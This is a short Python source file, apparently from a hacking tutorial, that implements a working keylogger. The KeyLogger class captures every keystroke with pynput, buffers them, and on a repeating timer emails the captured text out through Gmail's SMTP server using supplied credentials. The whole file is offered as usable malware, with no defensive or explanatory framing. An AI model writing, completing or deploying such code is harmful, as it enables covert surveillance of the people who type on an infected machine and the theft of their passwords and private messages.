import pynput.keyboard
import threading
import smtplib

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.log = "KeyLogger has started....."
        self.interval = time_interval
        self.email = email
        self.password = password
    def append_to_log(self, string):
        self.log += string

    def process_key(self, key):
        self.key = key
        try:
            current_key = str(self.key.char)    
        except AttributeError:
            if self.key == self.key.space:
                current_key = " "
            else:    
                current_key = " " + str(self.key) + " "
        self.append_to_log(current_key)
        

    def report(self):
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_keylogger = pynput.keyboard.Listener(on_press=self.process_key)
        with keyboard_keylogger:
            self.report()
            keyboard_keylogger.join()
